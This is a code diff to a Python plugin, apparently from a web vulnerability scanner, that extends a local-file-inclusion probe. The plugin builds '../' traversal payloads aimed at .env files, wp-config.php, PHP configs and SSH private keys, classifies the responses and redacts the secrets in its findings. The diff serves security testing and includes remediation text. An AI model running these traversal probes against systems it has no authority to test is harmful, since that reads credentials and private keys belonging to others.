@@ -1,9 +1,22 @@
 """
-HTTP-only path-style LFI exposure probe.
+HTTP-only path-style + traversal LFI exposure probe.
 
 This tool is intentionally separate from param:probe and param:exploit_probe:
-those tools mutate query/form parameters, while this one validates direct
-absolute-path reads such as https://target//var/run/secrets/... .
+those tools mutate query/form parameters with generic OS-file payloads
+(``../../etc/passwd``) and emit ``xasm-lfi-path-traversal``. This one validates
+direct absolute-path reads such as https://target//var/run/secrets/... AND —
+as the genuinely-new #318 capability — **application secrets reached by ``../``
+traversal through the download / files-contents file parameter family**
+(``.env`` / ``APP_KEY``, SSH private keys, ``config/*.php``), with body
+classification + secret redaction for those file types.
+
+It deliberately COMPLEMENTS (never duplicates) its siblings:
+  * ``param:exploit_probe._probe_lfi`` already owns generic OS-file traversal.
+  * ``git:source_disclosure_scanner`` owns ``.git`` exposure + history secret
+    mining, and nuclei ``http/exposures/`` owns naive root ``GET /.env`` /
+    ``GET /.git/*``. This probe therefore NEVER does a naive root ``.env`` GET
+    and NEVER touches ``.git`` — its value is the secret reached by escaping a
+    media/webroot via ``../`` (or surfaced as a MySQL ``LOAD_FILE()`` read).
 """
 
 import base64
@@ -81,6 +94,62 @@ LFI_TEMPLATE_RE = re.compile(
     r"|\*"
 )
 
+# --- #318 sensitive-file pack (application secrets, reached via ``../`` traversal) ---
+# Relative app secrets live under a webroot/media root and are reached by escaping
+# it with ``../``. NOTE: ``.git`` is intentionally absent — owned by
+# git:source_disclosure_scanner; naive root ``.env`` GETs are owned by nuclei.
+SENSITIVE_REL_FILES = [
+    ".env",
+    ".env.local",
+    ".env.production",
+    "config/database.php",
+    "config/config.php",
+    "config/app.php",
+    "app/etc/env.php",
+    "wp-config.php",
+]
+# Absolute system secrets (also worth a path-style ``//`` read).
+SENSITIVE_ABS_FILES = [
+    "/root/.ssh/id_rsa",
+    "/var/www/.env",
+    "/var/www/html/.env",
+    "/var/www/deploy/.env",
+]
+SENSITIVE_SSH_USERS = ["root", "ubuntu", "www-data", "admin", "deploy", "git", "app", "sherman"]
+# Parameter names whose value is a filesystem path we will fuzz with ``../`` traversal.
+TRAVERSAL_PARAM_NAMES = {"file", "filepath", "file_path", "filename", "download", "path", "doc", "document"}
+DEFAULT_TRAVERSAL_DEPTHS = [1, 2, 3, 4, 5, 6, 7, 8]
+
+# Positive content signatures for the new classifications (FP-safe: a status-200
+# SPA page never matches these without the actual secret bytes).
+PRIVATE_KEY_RE = re.compile(r"-----BEGIN (?:OPENSSH|RSA|EC|DSA|PGP|ENCRYPTED) PRIVATE KEY-----")
+PRIVATE_KEY_TYPE_RE = re.compile(r"-----BEGIN (OPENSSH|RSA|EC|DSA|PGP|ENCRYPTED) PRIVATE KEY-----")
+DOTENV_LINE_RE = re.compile(r"(?m)^[ \t]*(?:export[ \t]+)?[A-Z][A-Z0-9_]+=")
+DOTENV_KV_RE = re.compile(r"(?m)^[ \t]*(?:export[ \t]+)?([A-Z][A-Z0-9_]+)=(.*)$")
+DOTENV_STRONG_KEYS = (
+    "APP_KEY=",
+    "DB_PASSWORD=",
+    "DB_USERNAME=",
+    "DB_DATABASE=",
+    "AWS_SECRET_ACCESS_KEY=",
+    "AWS_ACCESS_KEY_ID=",
+    "SECRET_KEY=",
+    "MAIL_PASSWORD=",
+    "REDIS_PASSWORD=",
+    "JWT_SECRET=",
+    "STRIPE_SECRET",
+)
+LARAVEL_APP_KEY_RE = re.compile(r"(?m)^[ \t]*APP_KEY=(?:base64:)?[A-Za-z0-9+/=]{8,}")
+PHP_CONFIG_RE = re.compile(r"<\?php")
+PHP_CONFIG_MARKER_RE = re.compile(
+    r"define\s*\(|'password'|\"password\"|DB_PASSWORD|DB_USER|DB_HOST|"
+    r"DB_DATABASE|mysqli?_connect|new\s+PDO|getenv\(",
+    re.I,
+)
+# Recognition-only: a MySQL LOAD_FILE() DB-layer read primitive observed in the
+# request/param (this GET-only tool never executes SQLi — it tags the read).
+LOAD_FILE_RE = re.compile(r"LOAD_FILE\s*\(\s*['\"]?(?P<path>[^'\")]+)", re.I)
+
 
 class LfiFileExposureProbeTool(ToolPlugin):
     @property
@@ -102,6 +171,9 @@ class LfiFileExposureProbeTool(ToolPlugin):
                 "target": {"type": "string"},
                 "url": {"type": "string"},
                 "enabled": {"type": "boolean", "default": True},
+                "sensitiveFilePack": {"type": "boolean", "default": True},
+                "sensitiveFiles": {"type": "array", "items": {"type": "string"}},
+                "traversalDepth": {"type": "integer", "default": 8},
                 "paths": {"type": "array", "items": {"type": "string"}},
                 "urls": {"type": "array", "items": {"type": "string"}},
                 "discoveredUrls": {"type": "array", "items": {"type": "string"}},
@@ -167,8 +239,14 @@ class LfiFileExposureProbeTool(ToolPlugin):
         response_excerpt_bytes = max(0, min(int(parameters.get("responseExcerptBytes") or 4096), 16384))
         keep_raw_evidence = bool(parameters.get("keepRawEvidence", True))
 
-        paths = parameters.get("paths") if isinstance(parameters.get("paths"), list) else DEFAULT_PATHS
+        caller_paths = isinstance(parameters.get("paths"), list)
+        paths = parameters.get("paths") if caller_paths else DEFAULT_PATHS
         paths = [self._normalize_path(str(path)) for path in paths if str(path or "").strip()]
+        # #318: also try absolute system secrets (SSH keys, /var/www/.env) as
+        # path-style reads, unless the caller pinned an explicit path list.
+        if not caller_paths and bool(parameters.get("sensitiveFilePack", True)):
+            paths += [self._normalize_path(p) for p in SENSITIVE_ABS_FILES]
+            paths += [self._normalize_path(f"/home/{user}/.ssh/id_rsa") for user in SENSITIVE_SSH_USERS]
         paths = dedupe_keep_order(paths, max_paths)
 
         negative_path = self._normalize_path(str(parameters.get("negativeControlPath") or NEGATIVE_CONTROL_PATH))
@@ -249,6 +327,15 @@ class LfiFileExposureProbeTool(ToolPlugin):
                 }
                 if include_raw_bodies:
                     evidence["rawBody"] = fetched["bodyText"]
+                # #318: never let a raw .env / private key / php-config body leave
+                # the 0600 evidence dir — redact it from the returned results too.
+                if evidence.get("secretExposure"):
+                    evidence.pop("rawBody", None)
+                    if evidence.get("responseTranscript"):
+                        evidence["responseTranscript"] = (
+                            f"HTTP {evidence.get('status')} — response body redacted "
+                            f"({evidence.get('bytes')} bytes, sha256:{evidence.get('sha256')})"
+                        )
                 results.append(evidence)
                 finding = self._finding_for_evidence(evidence)
                 if finding:
@@ -271,6 +358,7 @@ class LfiFileExposureProbeTool(ToolPlugin):
                 "surfaceCandidates": len([r for r in results if r.get("source") != "direct-path"]),
                 "confirmedReads": len([r for r in results if r.get("confirmedRead")]),
                 "tokenExposures": len([r for r in results if r.get("tokenExposure")]),
+                "secretExposures": len([r for r in results if r.get("secretExposure")]),
                 "findings": len(findings),
             },
         }
@@ -388,6 +476,38 @@ class LfiFileExposureProbeTool(ToolPlugin):
             return {"classification": "container_network_config", "confirmedRead": True}
         if path.endswith("/resolv.conf") and RESOLV_LINE_RE.search(stripped):
             return {"classification": "container_network_config", "confirmedRead": True}
+        # --- #318 application-secret classifications. Placed AFTER the specific
+        # OS/container-file classifiers (passwd / os-release / hostname / …) so that
+        # e.g. /etc/os-release is not mistaken for a dotenv file, but BEFORE the
+        # generic catch-alls. The HTML/error + negative-control + status>=400 guards
+        # above already ran, so an SPA 200 cannot reach these positive-signature
+        # branches. ---
+        if PRIVATE_KEY_RE.search(stripped):
+            type_match = PRIVATE_KEY_TYPE_RE.search(stripped)
+            return {
+                "classification": "private_key",
+                "confirmedRead": True,
+                "secretExposure": True,
+                "keyType": type_match.group(1) if type_match else "UNKNOWN",
+            }
+        strong_keys = [key for key in DOTENV_STRONG_KEYS if key in stripped]
+        if len(DOTENV_LINE_RE.findall(stripped)) >= 2 or strong_keys:
+            has_aws_secret = "AWS_SECRET_ACCESS_KEY=" in stripped
+            return {
+                "classification": "dotenv_file",
+                "confirmedRead": True,
+                "secretExposure": True,
+                "appKeyPresent": bool(LARAVEL_APP_KEY_RE.search(stripped)),
+                "awsSecretPresent": has_aws_secret,
+                "envMaskedPairs": self._redact_dotenv_pairs(stripped),
+                "severityHint": "critical" if has_aws_secret else "high",
+            }
+        if PHP_CONFIG_RE.search(stripped) and PHP_CONFIG_MARKER_RE.search(stripped):
+            return {
+                "classification": "php_config_file",
+                "confirmedRead": True,
+                "secretExposure": True,
+            }
         if status < 400 and body == "":
             return {"classification": "empty_pseudo_file_or_suppressed_read", "confirmedRead": False}
         if status < 400 and stripped:
@@ -463,6 +583,15 @@ class LfiFileExposureProbeTool(ToolPlugin):
         request = evidence.get("requestTranscript")
         response = evidence.get("responseTranscript")
         curl_command = evidence.get("curlCommand")
+        # #318: for raw-secret reads (.env / private key / php config) the response
+        # body excerpt would leak the credential — replace it with a redacted marker.
+        # The request + curl (showing only the ../ traversal payload, never the
+        # secret) are kept; raw bytes live in the 0600 evidence dir.
+        sanitized_response = (
+            f"HTTP {evidence.get('status')} — response body redacted "
+            f"({evidence.get('bytes')} bytes, sha256:{evidence.get('sha256')}); "
+            f"raw bytes retained only in the 0600 evidence directory"
+        )
 
         if classification == "kubernetes_serviceaccount_token":
             claims = (evidence.get("jwt") or {}).get("claims") or {}
@@ -529,6 +658,70 @@ class LfiFileExposureProbeTool(ToolPlugin):
                 response=response,
                 curl_command=curl_command,
             )
+        if classification == "private_key":
+            key_type = str(evidence.get("keyType") or "UNKNOWN")
+            extracted_pk = [path, f"key-type:{key_type}", f"sha256:{evidence.get('sha256')}", f"bytes:{evidence.get('bytes')}"]
+            load_file = self._detect_load_file(url, path)
+            if load_file:
+                extracted_pk += ["db-primitive:mysql-load-file", f"load-file-path:{load_file['path']}"]
+            finding = self._finding(
+                template_id="xasm-lfi-private-key-exposed",
+                name="Private Key Exposed via LFI/Traversal",
+                severity="critical",
+                matched_at=url,
+                description=(
+                    "Path traversal / LFI exposed a private key. The key material is "
+                    "redacted here (type + sha256 only); raw bytes are retained solely "
+                    "in the 0600 on-disk evidence directory."
+                ),
+                remediation="Reject ../ traversal and absolute paths, serve only mapped file identifiers, and rotate the exposed key.",
+                matcher_name="openssh-private-key",
+                extracted=extracted_pk,
+                request=request,
+                response=sanitized_response,
+                curl_command=curl_command,
+            )
+            if load_file:
+                finding["dbFileReadPrimitive"] = "mysql_load_file"
+            return finding
+        if classification in {"dotenv_file", "php_config_file"}:
+            severity = str(evidence.get("severityHint") or "high")
+            extracted_env = list(extracted)
+            if evidence.get("appKeyPresent"):
+                extracted_env.append("APP_KEY present (Laravel)")
+            if evidence.get("awsSecretPresent"):
+                extracted_env.append("AWS secret present")
+            masked = evidence.get("envMaskedPairs")
+            if isinstance(masked, list):
+                extracted_env += masked
+            if classification == "php_config_file":
+                extracted_env.append("php-config:db-credentials-present")
+            load_file = self._detect_load_file(url, path)
+            if load_file:
+                extracted_env += ["db-primitive:mysql-load-file", f"load-file-path:{load_file['path']}"]
+            description = (
+                "Path traversal / LFI exposed an application secret file (.env / config). "
+                "Secret values are redacted (masked + sha256); raw bytes are retained "
+                "solely in the 0600 on-disk evidence directory."
+            )
+            if load_file:
+                description += " The read was surfaced via a MySQL LOAD_FILE() DB-layer primitive."
+            finding = self._finding(
+                template_id="xasm-lfi-app-secret-file-exposed",
+                name="Application Secret File Exposed via LFI/Traversal",
+                severity=severity,
+                matched_at=url,
+                description=description,
+                remediation="Reject ../ traversal and absolute paths, keep secrets outside the web/media root, and rotate exposed credentials.",
+                matcher_name="dotenv-app-secret" if classification == "dotenv_file" else "php-config-secret",
+                extracted=extracted_env,
+                request=request,
+                response=sanitized_response,
+                curl_command=curl_command,
+            )
+            if load_file:
+                finding["dbFileReadPrimitive"] = "mysql_load_file"
+            return finding
         if classification == "file_read":
             return self._finding(
                 template_id="xasm-lfi-path-style-file-read",
@@ -644,13 +837,23 @@ class LfiFileExposureProbeTool(ToolPlugin):
         candidates: List[str] = []
         surface_urls = self._extract_surface_urls(target, parameters)
         lfi_paths = [p for p in probe_paths if p != self._normalize_path(str(parameters.get("negativeControlPath") or NEGATIVE_CONTROL_PATH))]
+        # #318: app-secret pack reached by ``../`` traversal through a file/download param.
+        sensitive_targets = self._sensitive_traversal_targets(parameters)
+        depths = self._traversal_depths(parameters)
         for source_url in surface_urls:
             parsed = urlparse(source_url)
+            # #318: a surfaced URL that ALREADY carries a MySQL LOAD_FILE() read
+            # (e.g. handed off from a SQLi/sqlmap step) is probed AS-IS — this
+            # GET-only tool does not craft SQLi, it confirms + classifies + tags
+            # the DB-layer file read the upstream step found.
+            if LOAD_FILE_RE.search(source_url):
+                candidates.append(source_url)
             if parsed.query:
                 for path in lfi_paths:
                     rendered = self._replace_lfi_query_params(source_url, path)
                     if rendered:
                         candidates.append(rendered)
+                candidates.extend(self._traversal_candidate_urls(source_url, sensitive_targets, depths))
             if self._looks_like_lfi_path_template(parsed.path):
                 for path in lfi_paths:
                     rendered = self._render_path_template(target, parsed.path, path)
@@ -659,6 +862,9 @@ class LfiFileExposureProbeTool(ToolPlugin):
         for endpoint in self._extract_api_endpoints(target, parameters):
             path_value = endpoint.get("path") or endpoint.get("url") or ""
             parsed = urlparse(str(path_value))
+            endpoint_url = endpoint.get("url") or ""
+            if endpoint_url and urlparse(str(endpoint_url)).query:
+                candidates.extend(self._traversal_candidate_urls(str(endpoint_url), sensitive_targets, depths))
             endpoint_path = parsed.path if parsed.scheme else str(path_value)
             if not self._looks_like_lfi_path_template(endpoint_path):
                 continue
@@ -667,6 +873,80 @@ class LfiFileExposureProbeTool(ToolPlugin):
                 if rendered:
                     candidates.append(rendered)
         return dedupe_keep_order([url for url in candidates if same_origin(target, url)], 240)
+
+    def _sensitive_traversal_targets(self, parameters: Dict[str, Any]) -> List[str]:
+        """Relative-form secret targets (no leading slash) for ``../`` prefixing."""
+        if not bool(parameters.get("sensitiveFilePack", True)):
+            return []
+        targets = list(SENSITIVE_REL_FILES)
+        targets += [f"home/{user}/.ssh/id_rsa" for user in SENSITIVE_SSH_USERS]
+        targets += [abs_path.lstrip("/") for abs_path in SENSITIVE_ABS_FILES]
+        extra = parameters.get("sensitiveFiles")
+        if isinstance(extra, list):
+            targets += [str(item).lstrip("/") for item in extra if str(item or "").strip()]
+        return dedupe_keep_order(targets, 60)
+
+    def _traversal_depths(self, parameters: Dict[str, Any]) -> List[int]:
+        raw = parameters.get("traversalDepth")
+        if isinstance(raw, bool):
+            raw = None
+        if isinstance(raw, int) and raw > 0:
+            return list(range(1, min(raw, 12) + 1))
+        if isinstance(raw, list):
+            depths = [d for d in raw if isinstance(d, int) and 0 < d <= 12][:12]
+            return depths or list(DEFAULT_TRAVERSAL_DEPTHS)
+        return list(DEFAULT_TRAVERSAL_DEPTHS)
+
+    def _traversal_candidate_urls(self, url: str, sensitive_targets: List[str], depths: List[int]) -> List[str]:
+        parsed = urlparse(url)
+        query = parse_qsl(parsed.query, keep_blank_values=True)
+        if not any(name.lower() in TRAVERSAL_PARAM_NAMES for name, _ in query):
+            return []
+        out: List[str] = []
+        for target_file in sensitive_targets:
+            for payload in [target_file, *[("../" * depth) + target_file for depth in depths]]:
+                rendered = self._replace_traversal_param(url, payload)
+                if rendered:
+                    out.append(rendered)
+        return out
+
+    def _replace_traversal_param(self, url: str, payload: str) -> Optional[str]:
+        """Swap a traversal-family param with ``payload`` VERBATIM (keeps ``../``)."""
+        parsed = urlparse(url)
+        query = parse_qsl(parsed.query, keep_blank_values=True)
+        if not query:
+            return None
+        replaced = False
+        next_query: List[Tuple[str, str]] = []
+        for name, value in query:
+            if name.lower() in TRAVERSAL_PARAM_NAMES:
+                next_query.append((name, payload))
+                replaced = True
+            else:
+                next_query.append((name, value))
+        if not replaced:
+            return None
+        return urlunparse(parsed._replace(query=urlencode(next_query, doseq=True)))
+
+    def _detect_load_file(self, *sources: Any) -> Optional[Dict[str, str]]:
+        """Recognize a MySQL ``LOAD_FILE('/path')`` DB-layer read in any source string."""
+        for source in sources:
+            match = LOAD_FILE_RE.search(str(source or ""))
+            if match:
+                return {"primitive": "mysql_load_file", "path": match.group("path").strip()}
+        return None
+
+    def _redact_dotenv_pairs(self, body: str, limit: int = 25) -> List[str]:
+        """Mask dotenv values — key names kept, values replaced with sha256 digest."""
+        out: List[str] = []
+        for match in DOTENV_KV_RE.finditer(body or ""):
+            name = match.group(1).strip()
+            value = match.group(2).strip().strip('"').strip("'")
+            digest = hashlib.sha256(value.encode("utf-8", "replace")).hexdigest()[:12] if value else "empty"
+            out.append(f"{name}=<redacted:sha256:{digest}>")
+            if len(out) >= limit:
+                break
+        return out
 
     def _extract_surface_urls(self, target: str, parameters: Dict[str, Any]) -> List[str]:
         values: List[Any] = []
